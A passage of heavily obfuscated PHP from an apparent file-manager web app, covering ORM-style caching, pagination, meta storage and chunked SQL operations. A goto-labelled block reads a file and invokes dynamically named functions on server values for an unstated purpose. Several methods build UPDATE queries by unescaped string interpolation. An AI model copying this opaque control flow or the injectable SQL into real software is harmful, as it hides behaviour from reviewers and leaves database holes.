(!is_array($ΣύεΪσ)) { $ΣύεΪσ = call_user_func_array(array($this, $―θοΌπ), array($„ψΤΚ, !0)); Cache::set($Κΐφχ°, $ΣύεΪσ); } return $ΣύεΪσ; } public function cacheFunctionClear($ωψΐΟΪχ, $ϋ¨«ΎΉ, $Ϊ»³λΎ = '') { $δ¦›Θβ = $ϋ¨«ΎΉ; if (!is_array($ϋ¨«ΎΉ)) { $δ¦›Θβ = array($ϋ¨«ΎΉ); } foreach ($δ¦›Θβ as $ζσΈΪΜ) { $Ά―ΟώΠ = $this->cacheKeyMake($ωψΐΟΪχ, $ζσΈΪΜ, $Ϊ»³λΎ); Cache::remove($Ά―ΟώΠ); } } public function cacheKeyMake($χ±ο¦Ή, $€ΈΫ®Ά–, $ΏΦ‹«Ωµ) { $ΏοΒ†ψ =& $_SERVER[γγάψ½]; if ($ΏΦ‹«Ωµ) { $€ΈΫ®Ά– = $€ΈΫ®Ά– . $ΏοΒ†ψ[439] . $ΏΦ‹«Ωµ; } return get_class($this) . $ΏοΒ†ψ[11] . $χ±ο¦Ή . $ΏοΒ†ψ[440] . $€ΈΫ®Ά–; } protected function selectPageReset() { $ώ›ƒ£ρ‹ =& $_SERVER[γγάψ½]; if (isset($GLOBALS[$ώ›ƒ£ρ‹[441]])) { return; } $GLOBALS[$ώ›ƒ£ρ‹[441]] = isset($GLOBALS[$ώ›ƒ£ρ‹[7]][$ώ›ƒ£ρ‹[442]]) ? $GLOBALS[$ώ›ƒ£ρ‹[7]][$ώ›ƒ£ρ‹[442]] : !1; $GLOBALS[$ώ›ƒ£ρ‹[443]] = isset($GLOBALS[$ώ›ƒ£ρ‹[7]][$ώ›ƒ£ρ‹[431]]) ? $GLOBALS[$ώ›ƒ£ρ‹[7]][$ώ›ƒ£ρ‹[431]] : !1; $GLOBALS[$ώ›ƒ£ρ‹[7]][$ώ›ƒ£ρ‹[442]] = !1; $GLOBALS[$ώ›ƒ£ρ‹[7]][$ώ›ƒ£ρ‹[431]] = !1; } protected function selectPageRestore() { $Γφ–ώ§Σ =& $_SERVER[γγάψ½]; if (!isset($GLOBALS[$Γφ–ώ§Σ[441]])) { return; } $GLOBALS[$Γφ–ώ§Σ[7]][$Γφ–ώ§Σ[442]] = $GLOBALS[$Γφ–ώ§Σ[441]]; $GLOBALS[$Γφ–ώ§Σ[7]][$Γφ–ώ§Σ[431]] = $GLOBALS[$Γφ–ώ§Σ[443]]; if ($GLOBALS[$Γφ–ώ§Σ[7]][$Γφ–ώ§Σ[442]] === !1) { unset($GLOBALS[$Γφ–ώ§Σ[7]][$Γφ–ώ§Σ[442]]); } if ($GLOBALS[$Γφ–ώ§Σ[7]][$Γφ–ώ§Σ[431]] === !1) { unset($GLOBALS[$Γφ–ώ§Σ[7]][$Γφ–ώ§Σ[431]]); } unset($GLOBALS[$Γφ–ώ§Σ[441]]); unset($GLOBALS[$Γφ–ώ§Σ[443]]); } protected function selectPage($•ώμΜώ‰ = 200, $ΧώΌ±Ο = 1) { $”ωΰΨµς =& $_SERVER[γγάψ½]; global $in; $Ψ”»ΐυ = $this->optionsValue(); $’ ™‚Ν = 50000; $•ώμΜώ‰ = isset($in[$”ωΰΨµς[442]]) && $in[$”ωΰΨµς[442]] ? $in[$”ωΰΨµς[442]] : $•ώμΜώ‰; if ($•ώμΜώ‰ === -1) { $in[$”ωΰΨµς[442]] = !1; $’ ™‚Ν = 100000000; $•ώμΜώ‰ = $’ ™‚Ν; } $ΦΡν¥©― = $Ψ”»ΐυ; $ΦΡν¥©―[$”ωΰΨµς[444]] = array(); $•ώμΜώ‰ = intval($•ώμΜώ‰); $•ώμΜώ‰ = $•ώμΜώ‰ <= 5 ? 5 : ($•ώμΜώ‰ >= $’ ™‚Ν ? $’ ™‚Ν : $•ώμΜώ‰); $ΧώΌ±Ο = intval(isset($in[$”ωΰΨµς[431]]) && $in[$”ωΰΨµς[431]] ? $in[$”ωΰΨµς[431]] : $ΧώΌ±Ο); $ΧώΌ±Ο = $ΧώΌ±Ο <= 1 ? 1 : $ΧώΌ±Ο; $ύΌΰΣ•½ = array(); $Ος£ήΗ = 1; if ($ΧώΌ±Ο == 1 && $Ος£ήΗ) { $this->optionsValue($Ψ”»ΐυ); $ύΌΰΣ•½ = $this->page($ΧώΌ±Ο, $•ώμΜώ‰)->select(); $¨”Ώο¬ = is_array($ύΌΰΣ•½) ? count($ύΌΰΣ•½) : 0; if ($¨”Ώο¬ < $•ώμΜώ‰) { $Ψ½§†δ = 1; } else { $this->optionsValue($ΦΡν¥©―); $¨”Ώο¬ = intval($this->count()); $Ψ½§†δ = ceil($¨”Ώο¬ / $•ώμΜώ‰); } } else { $this->optionsValue($ΦΡν¥©―); $¨”Ώο¬ = intval($this->count()); $Ψ½§†δ = ceil($¨”Ώο¬ / $•ώμΜώ‰); $ΧώΌ±Ο = $ΧώΌ±Ο >= $Ψ½§†δ ? $Ψ½§†δ : $ΧώΌ±Ο; $this->optionsValue($Ψ”»ΐυ); $ύΌΰΣ•½ = $this->page($ΧώΌ±Ο, $•ώμΜώ‰)->select(); } if (!is_array($ύΌΰΣ•½)) { $ύΌΰΣ•½ = array(); } if ($Ψ½§†δ == 1) { $¨”Ώο¬ = count($ύΌΰΣ•½); } $”£µΞ = array($”ωΰΨµς[445] => array($”ωΰΨµς[446] => $¨”Ώο¬, $”ωΰΨµς[442] => $•ώμΜώ‰, $”ωΰΨµς[431] => $ΧώΌ±Ο, $”ωΰΨµς[447] => $Ψ½§†δ), $”ωΰΨµς[448] => $ύΌΰΣ•½); return $”£µΞ; } protected function checkLength($βξ„ΨΓΎ, $—δίΩ¶ = 0, $Θ΅Κ¬µΕ = '') { $ξψμΈΔ =& $_SERVER[γγάψ½]; $—δίΩ¶ = $—δίΩ¶ ? $—δίΩ¶ : 65536; if (!$βξ„ΨΓΎ || strlen($βξ„ΨΓΎ) < $—δίΩ¶) { return; } $Θ΅Κ¬µΕ = $Θ΅Κ¬µΕ ? $Θ΅Κ¬µΕ . $ξψμΈΔ[74] : $ξψμΈΔ[12]; show_json($Θ΅Κ¬µΕ . LNG($ξψμΈΔ[449]) . "\50{$—δίΩ¶}\51", !1); } protected function metaSet($ƒΧΗ¨, $›ΞΊ™ = null, $ώϋ–± = null) { $οφ΅½ύ =& $_SERVER[γγάψ½]; if (!$this->tableMeta || !$ƒΧΗ¨) { return !1; } $ςζ½¤ = $this->tableMeta[$οφ΅½ύ[450]]; $ „§ΏΛΐ = $this->tableMeta[$οφ΅½ύ[451]]; $ϋΥ£­ = Model($ „§ΏΛΐ); $…ωΗφ = array($ςζ½¤ => $ƒΧΗ¨, $οφ΅½ύ[452] => $›ΞΊ™); if (is_null($›ΞΊ™)) { return $ϋΥ£­->where(array($ςζ½¤ => $ƒΧΗ¨))->delete(); } if (is_null($ώϋ–±) && is_string($›ΞΊ™)) { return $ϋΥ£­->where($…ωΗφ)->delete(); } $ΘΎάί = is_array($›ΞΊ™) ? $›ΞΊ™ : array(); if (is_string($›ΞΊ™)) { $ΘΎάί[$›ΞΊ™] = $ώϋ–±; } $µ£Ή = array(); foreach ($ΘΎάί as $Ή‘τ«Β“ => $ώ¦Πχ€) { if (is_null($ώ¦Πχ€) && is_string($Ή‘τ«Β“)) { $ϋΥ£­->where(array($ςζ½¤ => $ƒΧΗ¨, $οφ΅½ύ[452] => $Ή‘τ«Β“))->delete(); continue; } $this->checkLength($ώ¦Πχ€, !1, $ „§ΏΛΐ . $οφ΅½ύ[4] . $Ή‘τ«Β“); $µ£Ή[] = array($ςζ½¤ => $ƒΧΗ¨, $οφ΅½ύ[97] => $Ή‘τ«Β“, $οφ΅½ύ[453] => $ώ¦Πχ€); } $πΥ΄ήΪ« = $οφ΅½ύ[454] . $ „§ΏΛΐ; CacheLock::lock($πΥ΄ήΪ«); $ϋΥ£­->where(array($ςζ½¤ => $ƒΧΗ¨))->addAll($µ£Ή, array(), !0); CacheLock::unlock($πΥ΄ήΪ«); return !0; } public function metaGet($ύΗό†‚°, $πύ›ΉθΥ = false) { $Ο…έέΌκ =& $_SERVER[γγάψ½]; if (!$this->tableMeta) { return array(); } $ΫƒέσΙ = $this->tableMeta[$Ο…έέΌκ[450]]; $ρ¶ΛΎίΈ = Model($this->tableMeta[$Ο…έέΌκ[451]]); if ($πύ›ΉθΥ) { $Ϋνπ®Ά = array($ΫƒέσΙ => $ύΗό†‚°, $Ο…έέΌκ[97] => $πύ›ΉθΥ); return $ρ¶ΛΎίΈ->where($Ϋνπ®Ά)->getField($Ο…έέΌκ[453]); } $Ϋνπ®Ά = array($ΫƒέσΙ => $ύΗό†‚°); $“π€Ζ«Ω = $ρ¶ΛΎίΈ->field($Ο…έέΌκ[455])->where($Ϋνπ®Ά)->select(); $“π€Ζ«Ω = array_to_keyvalue($“π€Ζ«Ω, $Ο…έέΌκ[97], $Ο…έέΌκ[453]); return $“π€Ζ«Ω; } private function checkDataAutoHas($Ωάνμ‚) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Ϊ¬ΓΔά’) { if (in_array($Ωάνμ‚, explode($_SERVER[γγάψ½][50], $Ϊ¬ΓΔά’[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$πεήψΖ, $Ηςΐδ) { $χΖΧ’Ζ‰ =& $_SERVER[γγάψ½]; if (!is_array($πεήψΖ)) { return; } foreach ($this->dataAuto as $¶£ςό) { $ΊεδΔ = $¶£ςό[0]; if (!in_array($Ηςΐδ, explode($χΖΧ’Ζ‰[50], $¶£ςό[2]))) { continue; } switch (trim($¶£ςό[3])) { case $χΖΧ’Ζ‰[399]: case $χΖΧ’Ζ‰[400]: $‚ίΛΛ› = $¶£ςό[1]; $…δ―λχ = isset($¶£ςό[4]) ? (array) $¶£ςό[4] : array(); if ($‚ίΛΛ› == $χΖΧ’Ζ‰[207] && array_key_exists($ΊεδΔ, $πεήψΖ)) { if (!$πεήψΖ[$ΊεδΔ]) { unset($πεήψΖ[$ΊεδΔ]); } break; } if (isset($πεήψΖ[$ΊεδΔ])) { array_unshift($…δ―λχ, $πεήψΖ[$ΊεδΔ]); } if ($χΖΧ’Ζ‰[399] == $¶£ςό[3]) { $πεήψΖ[$ΊεδΔ] = call_user_func_array($‚ίΛΛ›, $…δ―λχ); } else { $πεήψΖ[$ΊεδΔ] = call_user_func_array(array(&$this, $‚ίΛΛ›), $…δ―λχ); } break; case $χΖΧ’Ζ‰[350]: if (isset($πεήψΖ[$ΊεδΔ]) && $πεήψΖ[$ΊεδΔ]) { $πεήψΖ[$ΊεδΔ] = call_user_func_array(array(&$this, $¶£ςό[1]), array($πεήψΖ[$ΊεδΔ])); } break; case $χΖΧ’Ζ‰[353]: $πεήψΖ[$ΊεδΔ] = $πεήψΖ[$¶£ςό[1]]; break; case $χΖΧ’Ζ‰[372]: if (isset($πεήψΖ[$ΊεδΔ]) && !is_string($πεήψΖ[$ΊεδΔ])) { $πεήψΖ[$ΊεδΔ] = json_encode_force($πεήψΖ[$ΊεδΔ]); } break; case $χΖΧ’Ζ‰[401]: if ($πεήψΖ[$ΊεδΔ] === $χΖΧ’Ζ‰[12]) { unset($πεήψΖ[$ΊεδΔ]); } break; case $χΖΧ’Ζ‰[402]: $πεήψΖ[$ΊεδΔ] = $¶£ςό[1]; default: break; } } if ($Ηςΐδ == $χΖΧ’Ζ‰[433]) { $»©ϊ†γ΄ = strtolower($this->db->getDbType()); if (strpos($»©ϊ†γ΄, $χΖΧ’Ζ‰[13]) !== 0) { return; } $ώιΒϊ• = $this->field(!0)->fields; $ΣΓ―³ = $ώιΒϊ•[$χΖΧ’Ζ‰[332]]; if (isset($ώιΒϊ•[$χΖΧ’Ζ‰[331]])) { unset($ΣΓ―³[$ώιΒϊ•[$χΖΧ’Ζ‰[331]]]); } foreach ($ΣΓ―³ as $ίε°ήΙ => $Ηςΐδ) { if (!isset($πεήψΖ[$ίε°ήΙ])) { $πεήψΖ[$ίε°ήΙ] = $χΖΧ’Ζ‰[12]; } } } } private function dataAfterFilter(&$¤ΐζ¥κβ) { $£Ψ®›α‰ =& $_SERVER[γγάψ½]; foreach ($this->dataAuto as $ ω²™«») { $ώϋωΈ£ = $ ω²™«»[0]; if (!isset($¤ΐζ¥κβ[$ώϋωΈ£])) { continue; } if (!in_array($£Ψ®›α‰[435], explode($£Ψ®›α‰[50], $ ω²™«»[2]))) { continue; } switch (trim($ ω²™«»[3])) { case $£Ψ®›α‰[399]: case $£Ψ®›α‰[400]: $¥ΪΦ§• = isset($ ω²™«»[4]) ? (array) $ ω²™«»[4] : array(); array_unshift($¥ΪΦ§•, $¤ΐζ¥κβ[$ώϋωΈ£]); if (isset($ ω²™«»[4]) && $ ω²™«»[4] == $£Ψ®›α‰[456]) { $¥ΪΦ§• = array($¤ΐζ¥κβ[$ώϋωΈ£]); } if ($£Ψ®›α‰[399] == $ ω²™«»[3]) { $¤ΐζ¥κβ[$ώϋωΈ£] = call_user_func_array($ ω²™«»[1], $¥ΪΦ§•); } else { $¤ΐζ¥κβ[$ώϋωΈ£] = call_user_func_array(array(&$this, $ ω²™«»[1]), $¥ΪΦ§•); } break; case $£Ψ®›α‰[350]: if (isset($¤ΐζ¥κβ[$ώϋωΈ£]) && $¤ΐζ¥κβ[$ώϋωΈ£]) { $¤ΐζ¥κβ[$ώϋωΈ£] = call_user_func_array(array(&$this, $ ω²™«»[1]), array($¤ΐζ¥κβ[$ώϋωΈ£])); } break; case $£Ψ®›α‰[353]: $¤ΐζ¥κβ[$ώϋωΈ£] = $¤ΐζ¥κβ[$ ω²™«»[1]]; break; case $£Ψ®›α‰[372]: $’ψ²§Ύΐ = $¤ΐζ¥κβ[$ώϋωΈ£]; $¤ΐζ¥κβ[$ώϋωΈ£] = json_decode($’ψ²§Ύΐ, !0); if (is_null($¤ΐζ¥κβ[$ώϋωΈ£])) { $¤ΐζ¥κβ[$ώϋωΈ£] = $’ψ²§Ύΐ; } break; case $£Ψ®›α‰[401]: if ($¤ΐζ¥κβ[$ώϋωΈ£] === $£Ψ®›α‰[12]) { unset($¤ΐζ¥κβ[$ώϋωΈ£]); } break; case $£Ψ®›α‰[402]: $¤ΐζ¥κβ[$ώϋωΈ£] = $ ω²™«»[1]; break; default: break; } } } public function saveAll($—®΅ςν) { $“ΪΈΑψ =& $_SERVER[γγάψ½]; $ίθ•χ» = $this->tablePrefix . $this->tableName; $βΌ€‚Ψ = self::SQL_WHERE_IN_CHUNK; $—®΅ςν = is_array($—®΅ςν) ? $—®΅ςν : array(); $ƒώΞ“€ƒ = $“ΪΈΑψ[457]; $¬ήΫώυΰ = 0; $ξθθ®Ν = array(); $ΰΣ»ΈΣΙ = count($—®΅ςν); for ($ΜΈ£Μ = 0; $ΜΈ£Μ < $ΰΣ»ΈΣΙ; $ΜΈ£Μ++) { $γ–ξΫςϋ = $—®΅ςν[$ΜΈ£Μ]; if (!is_array($γ–ξΫςϋ) || count($γ–ξΫςϋ) != 4) { continue; } $φΜΊεη = "\125\x50\104\x41\124\105\x20\x60{$ίθ•χ»}\x60\x20\x53\105\x54\x20{$γ–ξΫςϋ[2]}\40\75\40\103\x41\123\x45\x20{$γ–ξΫςϋ[0]}\x20\xa"; if ($¬ήΫώυΰ == 0) { $ƒώΞ“€ƒ = $φΜΊεη; } $ξθθ®Ν[] = $“ΪΈΑψ[121] . $γ–ξΫςϋ[1] . $“ΪΈΑψ[121]; $¬ήΫώυΰ++; $ƒώΞ“€ƒ .= "\40\x57\110\105\x4e\40\47{$γ–ξΫςϋ[1]}\47\x20\124\110\105\x4e\x20\47{$γ–ξΫςϋ[3]}\x27\x20\xa"; if ($¬ήΫώυΰ == $βΌ€‚Ψ || $ΜΈ£Μ == $ΰΣ»ΈΣΙ - 1) { $ƒ†®ΤΜΙ = implode($“ΪΈΑψ[50], $ξθθ®Ν); $ƒώΞ“€ƒ .= "\40\x45\x4e\104\40\40\x57\x48\x45\x52\x45\x20{$γ–ξΫςϋ[0]}\40\x49\116\40\x28{$ƒ†®ΤΜΙ}\x29\40"; $this->execute($ƒώΞ“€ƒ); $¬ήΫώυΰ = 0; $ƒώΞ“€ƒ = $φΜΊεη; $this->chunkEventCheck(count($ξθθ®Ν)); $ξθθ®Ν = array(); } } $this->chunkEventSet(); } public function saveAllEach($έ°ΕΓ) { $£²Ω•Α =& $_SERVER[γγάψ½]; $ΆίΔΝ = $this->tablePrefix . $this->tableName; foreach ($έ°ΕΓ as $»ΰ‰βΞ) { if (!is_array($»ΰ‰βΞ) || count($»ΰ‰βΞ) != 4) { continue; } $ΡΆ‘¤ = $»ΰ‰βΞ[0] . $£²Ω•Α[458] . $»ΰ‰βΞ[1] . $£²Ω•Α[121]; $ψ‹ς— = $»ΰ‰βΞ[2] . $£²Ω•Α[458] . $»ΰ‰βΞ[3] . $£²Ω•Α[121]; $ρ±†Πξ = "\165\x70\144\x61\164\145\40{$ΆίΔΝ}\40\163\x65\164\40{$ψ‹ς—}\40\167\150\x65\162\145\x20{$ΡΆ‘¤}\73"; $this->execute($ρ±†Πξ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Πά‡‰Όη = false, $δχ¶’ = false) { $this->_chunkEvent = $Πά‡‰Όη; $this->_chunkEventParam = $δχ¶’; } private function chunkEventCheck($’†Ξ«ψ) { if (!$this->_chunkEvent) { return; } $Ά¦Ά‡ϋ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Ά¦Ά‡ϋ[$_SERVER[γγάψ½][459]] = $’†Ξ«ψ; Hook::trigger($this->_chunkEvent, $Ά¦Ά‡ϋ); } public function addAll($ί„ΎεΞΌ, $ι ¬ίΉη = array(), $χ¬όΟεέ = false) { $¥¤΅Έ‘ύ =& $_SERVER[γγάψ½]; ignore_timeout(); $ψ΄Ν¶Δ = self::SQL_WHERE_IN_CHUNK; if (empty($ί„ΎεΞΌ)) { $this->error = think_lang($¥¤΅Έ‘ύ[351]); return !1; } $ι ¬ίΉη = $this->_parseOptions($ι ¬ίΉη); foreach ($ί„ΎεΞΌ as $ςφ²­ => $Θή›ΘΨ) { $ί„ΎεΞΌ[$ςφ²­] = $this->_facade($Θή›ΘΨ); $this->_beforeInsert($ί„ΎεΞΌ[$ςφ²­], $ι ¬ίΉη); } if (method_exists($this->db, $¥¤΅Έ‘ύ[352])) { for ($«ΤΠ = 0; $«ΤΠ < count($ί„ΎεΞΌ); $«ΤΠ += $ψ΄Ν¶Δ) { $©νΞα = array_slice($ί„ΎεΞΌ, $«ΤΠ, $ψ΄Ν¶Δ); if (!is_array($©νΞα) || count($©νΞα) == 0) { break; } $ζΡ†Ζπ = $this->db->insertAll($©νΞα, $ι ¬ίΉη, $χ¬όΟεέ); $this->chunkEventCheck(count($©νΞα)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ί„ΎεΞΌ as $ςφ²­ => $Θή›ΘΨ) { $ζΡ†Ζπ = $this->db->insert($Θή›ΘΨ, $ι ¬ίΉη, $χ¬όΟεέ); } $this->commit(); } if (!1 !== $ζΡ†Ζπ) { $νε»λυ = $this->getLastInsID(); if ($νε»λυ) { return $νε»λυ; } } return $ζΡ†Ζπ; } public function save($φ‘­ΑΕ = '', $Λ†‚›΄ώ = array()) { $ώβ©Γσα =& $_SERVER[γγάψ½]; $΄πΟΩΣό = self::SQL_WHERE_IN_CHUNK; $›°ξΪ¥ = $this->optionsValue(); $«ί–έθ = $this->findWhereField($›°ξΪ¥); if (!$«ί–έθ) { return parent::save($φ‘­ΑΕ, $Λ†‚›΄ώ); } $σαΚ©ΰ– = 0; $΄τΜζ = $›°ξΪ¥[$ώβ©Γσα[355]][$«ί–έθ][1]; $΄τΜζ = is_array($΄τΜζ) ? $΄τΜζ : array(); $λΫμΝ­ = count($΄τΜζ); for ($Ήψ•²φ» = 0; $Ήψ•²φ» < $λΫμΝ­; $Ήψ•²φ» += $΄πΟΩΣό) { $³ζ³ΜφΉ = array_slice($΄τΜζ, $Ήψ•²φ», $΄πΟΩΣό); if (!is_array($³ζ³ΜφΉ) || count($³ζ³ΜφΉ) == 0) { break; } $›°ξΪ¥[$ώβ©Γσα[355]][$«ί–έθ][1] = $³ζ³ΜφΉ; $this->optionsValue($›°ξΪ¥); $σαΚ©ΰ– += parent::save($φ‘­ΑΕ, $Λ†‚›΄ώ); $this->chunkEventCheck(count($³ζ³ΜφΉ)); } $this->chunkEventSet(); return $σαΚ©ΰ–; } public function add($βΕ‚‡Μ“ = '', $§θΆΚ¬¥ = array(), $»ε–¨ = false) { if ($this->addTaskStatus && is_array($βΕ‚‡Μ“)) { $this->addTaskData[] = $βΕ‚‡Μ“; return; } return parent::add($βΕ‚‡Μ“, $§θΆΚ¬¥, $»ε–¨); } public function parseWhereLike($γ„¥Β, $ρΒ ΕτΔ = '', $€Β‡“ = false, &$²ΖΚ΅ = false) { $ΣΧµν”Γ =& $_SERVER[γγάψ½]; $Ξ° ΄ε = $GLOBALS[$ΣΧµν”Γ[6]][$ΣΧµν”Γ[460]]; if (!$Ξ° ΄ε[$ΣΧµν”Γ[461]]) { return $γ„¥Β; } if (!is_array($γ„¥Β)) { return $γ„¥Β; } $½έµά†ΰ = array(); $ΉςΧ΄‹τ = 0; foreach ($γ„¥Β as $ύ›Μ §Ό => $χ‚£†) { if (is_array($χ‚£†) && count($χ‚£†) == 2 && $χ‚£†[0] == $ΣΧµν”Γ[462] && is_string($χ‚£†[1]) && substr($χ‚£†[1], 0, 1) == $ΣΧµν”Γ[463] && substr($χ‚£†[1], strlen($χ‚£†[1]) - 1, 1) == $ΣΧµν”Γ[463]) { $²ΖΚ΅ = !0; $Ϋ¥ϋ»„Χ = is_string($ύ›Μ §Ό) ? $ύ›Μ §Ό : $ρΒ ΕτΔ; $‰…ƒέ¬ = substr($χ‚£†[1], 1, strlen($χ‚£†[1]) - 2); $‰…ƒέ¬ = $this->db->escapeString($‰…ƒέ¬); if (!strpos($Ϋ¥ϋ»„Χ, $ΣΧµν”Γ[10])) { $Ϋ¥ϋ»„Χ = $ΣΧµν”Γ[464] . $Ϋ¥ϋ»„Χ . $ΣΧµν”Γ[464]; } $ίιϋ­ = $ΣΧµν”Γ[223] . $‰…ƒέ¬ . $ΣΧµν”Γ[223]; $‰…ƒέ¬ = str_replace(array($ΣΧµν”Γ[10], $ΣΧµν”Γ[465], $ΣΧµν”Γ[11]), $ΣΧµν”Γ[466], $‰…ƒέ¬); if ($Ξ° ΄ε[$ΣΧµν”Γ[467]]) { $ίιϋ­ = $ΣΧµν”Γ[468] . $‰…ƒέ¬ . $ΣΧµν”Γ[469]; if ($Ξ° ΄ε[$ΣΧµν”Γ[470]]) { $ίιϋ­ = $ΣΧµν”Γ[469] . $‰…ƒέ¬ . $ΣΧµν”Γ[468]; } } $½έµά†ΰ[$ΉςΧ΄‹τ] = $ΣΧµν”Γ[471] . $Ϋ¥ϋ»„Χ . $ΣΧµν”Γ[472] . $ίιϋ­ . $ΣΧµν”Γ[473]; $ΉςΧ΄‹τ++; continue; } if (is_array($χ‚£†)) { $ρΒ ΕτΔ = is_string($ύ›Μ §Ό) ? $ύ›Μ §Ό : $ρΒ ΕτΔ; $χ‚£† = $this->parseWhereLike($χ‚£†, $ρΒ ΕτΔ, !0, $²ΖΚ΅); } if (is_numeric($ύ›Μ §Ό)) { $½έµά†ΰ[$ΉςΧ΄‹τ] = $χ‚£†; $ΉςΧ΄‹τ++; } else { $½έµά†ΰ[$ύ›Μ §Ό] = $χ‚£†; } } if ($²ΖΚ΅ && !$€Β‡“) { } return $½έµά†ΰ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Ή—ΰΉΘ = array()) { $ωΧ‘ΊΑ =& $_SERVER[γγάψ½]; $φχΌΗΗ = self::SQL_WHERE_IN_CHUNK; $£––Δ‹Β = $this->optionsValue(); $ϋ°ώΆΓ = $this->findWhereField($£––Δ‹Β); if (!$ϋ°ώΆΓ || isset($£––Δ‹Β[$ωΧ‘ΊΑ[370]]) || isset($£––Δ‹Β[$ωΧ‘ΊΑ[431]])) { return parent::select($Ή—ΰΉΘ); } $Ωϊχ—» = $£––Δ‹Β[$ωΧ‘ΊΑ[355]][$ϋ°ώΆΓ][1]; $Ωϊχ—» = is_array($Ωϊχ—») ? $Ωϊχ—» : array(); $Δ‚ύ΅θ = null; for ($›ϋΰέ“¬ = 0; $›ϋΰέ“¬ < count($Ωϊχ—»); $›ϋΰέ“¬ += $φχΌΗΗ) { $ο–Ν–ε = array_slice($Ωϊχ—», $›ϋΰέ“¬, $φχΌΗΗ); if (!is_array($ο–Ν–ε) || count($ο–Ν–ε) == 0) { break; } $£––Δ‹Β[$ωΧ‘ΊΑ[355]][$ϋ°ώΆΓ][1] = $ο–Ν–ε; $this->optionsValue($£––Δ‹Β); $¦Ω³λ = parent::select($Ή—ΰΉΘ); if (!$¦Ω³λ) { continue; } $Δ‚ύ΅θ = is_array($Δ‚ύ΅θ) ? $Δ‚ύ΅θ : array(); $Δ‚ύ΅θ = array_merge($Δ‚ύ΅θ, $¦Ω³λ); } return $Δ‚ύ΅θ; } public function delete($ϊ®®ΪΤ = array()) { $Ώ‹Ρ‡θ =& $_SERVER[γγάψ½]; $Μ άΙ¤ = self::SQL_WHERE_IN_CHUNK; $­ώο‹‹ώ = $this->optionsValue(); $Π«Δπ®‹ = $this->findWhereField($­ώο‹‹ώ); if (!$Π«Δπ®‹) { return parent::delete($ϊ®®ΪΤ); } $ΈΐΗ = 0; $ΤπίΝ  = $­ώο‹‹ώ[$Ώ‹Ρ‡θ[355]][$Π«Δπ®‹][1]; $ΤπίΝ  = is_array($ΤπίΝ ) ? $ΤπίΝ  : array(); for ($§Κύΐ = 0; $§Κύΐ < count($ΤπίΝ ); $§Κύΐ += $Μ άΙ¤) { $‹ΔίΆψ = array_slice($ΤπίΝ , $§Κύΐ, $Μ άΙ¤); if (!is_array($‹ΔίΆψ) || count($‹ΔίΆψ) == 0) { break; } $­ώο‹‹ώ[$Ώ‹Ρ‡θ[355]][$Π«Δπ®‹][1] = $‹ΔίΆψ; $this->optionsValue($­ώο‹‹ώ); $ΈΐΗ += parent::delete($ϊ®®ΪΤ); } return $ΈΐΗ; } private function findWhereField($ψΔ«£‘ή) { $―”ί„χΝ =& $_SERVER[γγάψ½]; $½¬Β° = self::SQL_WHERE_IN_CHUNK; if (!is_array($ψΔ«£‘ή) || !is_array($ψΔ«£‘ή[$―”ί„χΝ[355]])) { return !1; } foreach ($ψΔ«£‘ή[$―”ί„χΝ[355]] as $ώΏΌσχ => $Ϋ®¥‚€) { if (is_array($Ϋ®¥‚€) && isset($Ϋ®¥‚€[0]) && is_string($Ϋ®¥‚€[0]) && strtolower($Ϋ®¥‚€[0]) == $―”ί„χΝ[7] && is_array($Ϋ®¥‚€[1]) && count($Ϋ®¥‚€[1]) > $½¬Β°) { ignore_timeout(); return $ώΏΌσχ; } } return !1; } public function setMasterDB($ρ›¶›μ = true) { think_config($_SERVER[γγάψ½][474], $ρ›¶›μ); } } goto c»®»½; EΫθ‘Υρκ: if ($_SERVER[$_SERVER[γγάψ½][961]] != $_SERVER[$_SERVER[γγάψ½][1709]]) { $_getc = $_SERVER[γγάψ½][963]; $_getfile = $_SERVER[$_SERVER[γγάψ½][958]] . $_SERVER[γγάψ½][959]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[γγάψ½][288], $_getfilec); if (count($_getarrs) < $_SERVER[γγάψ½][706]) { $exit = $_SERVER[γγάψ½][964]; $exit(); } $_act = $_SERVER[γγάψ½][1624]; $_act($_SERVER[$_SERVER[γγάψ½][1623]]); } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ΆρƒΈ™) { $ΐ¬ΕΓ° =& $_SERVER[γγάψ½]; $ ΝΰΑξΗ = Model($ΐ¬ΕΓ°[582])->where(array($ΐ¬ΕΓ°[1784] => $ΆρƒΈ™))->find(); $ά„·΅ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ΆρƒΈ™, $ ΝΰΑξΗ[$ΐ¬ΕΓ°[32]]); $this->userDesktopAdd($ά„·΅); return $ά„·΅; } public function userDesktopAdd($“σΖ ™) { $΅Ϊ›άσ© =& $_SERVER[γγάψ½]; $ξξ›θώ« = LNG($΅Ϊ›άσ©[2276]); $ΐΉ³κ† = $this->mkdir($“σΖ ™, $ξξ›θώ«); $this->metaSet($ΐΉ³κ†, $΅Ϊ›άσ©[2277], $΅Ϊ›άσ©[91]); $this->metaSet($“σΖ ™, $΅Ϊ›άσ©[2278], $ΐΉ³κ†); } public function userPathSafeAdd($σηΏΟκ) { $ϊ—Φ½µ =& $_SERVER[γγάψ½]; $»τ–ΙΎ” = Model($ϊ—Φ½µ[582])->getInfoFull($σηΏΟκ); if (!$»τ–ΙΎ”) { return !1; } if (_get($»τ–ΙΎ”, $ϊ—Φ½µ[603])) { return $»τ–ΙΎ”[$ϊ—Φ½µ[544]][$ϊ—Φ½µ[2279]]; } $»½ ΥΤ = $this->_mkdirRoot(SourceModel::TYPE_USER, $σηΏΟκ, $ϊ—Φ½µ[2280], $ϊ—Φ½µ[2281]); Model($ϊ—Φ½µ[582])->metaSet($σηΏΟκ, $ϊ—Φ½µ[2279], $»½ ΥΤ); $this->metaSet($»½ ΥΤ, $ϊ—Φ½µ[2282], $σηΏΟκ); return $»½ ΥΤ; } public function userPathAppAdd($υ ό , $•¦ω®„€ = '', $θα‹Έ = '') { $«ε¦ΨΠη =& 